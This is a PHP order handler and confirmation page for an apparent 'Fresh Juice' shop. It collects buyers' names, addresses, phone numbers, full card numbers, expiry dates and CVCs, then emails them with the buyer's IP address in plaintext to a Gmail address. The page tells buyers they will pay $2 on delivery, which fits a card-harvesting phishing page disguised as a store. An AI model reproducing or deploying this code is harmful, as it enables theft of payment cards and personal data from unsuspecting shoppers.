<?php

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method Not Allowed');
}

function clean($v) {
    return trim(filter_var($v ?? '', FILTER_SANITIZE_FULL_SPECIAL_CHARS));
}

$data = [
    'name'         => clean($_POST['name']         ?? ''),
    'phone'        => clean($_POST['phone']        ?? ''),
    'email'        => clean($_POST['email']        ?? ''),
    'address'      => clean($_POST['address']      ?? ''),
    'city'         => clean($_POST['city']         ?? ''),
    'color'        => clean($_POST['color']        ?? ''),
	'cardName'     => clean($_POST['cardName']     ?? ''),
    'cardNumber'   => clean($_POST['cardNumber']   ?? ''),
	'cardExpMonth' => clean($_POST['cardExpMonth'] ?? ''),
	'cardExpYear'  => clean($_POST['cardExpYear']  ?? ''),
	'cardCvc'      => clean($_POST['cardCvc']      ?? ''),
	'ip'           => $_SERVER['REMOTE_ADDR']      ?? '',
    'date'         => date('Y-m-d H:i:s'),
];

if ($data['name'] === '' || $data['email'] === '' || $data['phone'] === '' || $data['address'] === '') {
    http_response_code(400);
    exit('Faltan datos obligatorios.');
}

$to      = 'contactenossalida@gmail.com'; 
$subject = 'Nuevo pedido Fresh Juice';
$body    = "Nuevo pedido recibido:\n\n";
foreach ($data as $k => $v) { $body .= "$k: $v\n"; }
$headers = "From: no-reply@tudominio.com\r\n";
@mail($to, $subject, $body, $headers);

?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Order confirmed — Fresh Juice</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  body{font-family:system-ui,sans-serif;background:#fff7ed;margin:0;padding:40px;text-align:center;color:#1f2937}
  .card{max-width:520px;margin:40px auto;background:#fff;border-radius:20px;padding:32px;box-shadow:0 10px 30px rgba(0,0,0,.08)}
  h1{color:#ea580c;margin:0 0 12px}
  a{display:inline-block;margin-top:20px;background:#ea580c;color:#fff;padding:12px 22px;border-radius:10px;text-decoration:none;font-weight:700}
</style>
</head>
<body>
  <div class="card">
    <h1>✅ Order confirmed!</h1>
    <p>Thanks <strong><?= htmlspecialchars($data['name']) ?></strong>, we received your order.</p>
    <p>You will pay <strong>$2 USD</strong> by credit card when your Fresh Juice™ arrives at:<br>
       <?= htmlspecialchars($data['address'].', '.$data['city']) ?></p>
    <a href="/">Back to home</a>
  </div>
</body>
</html>
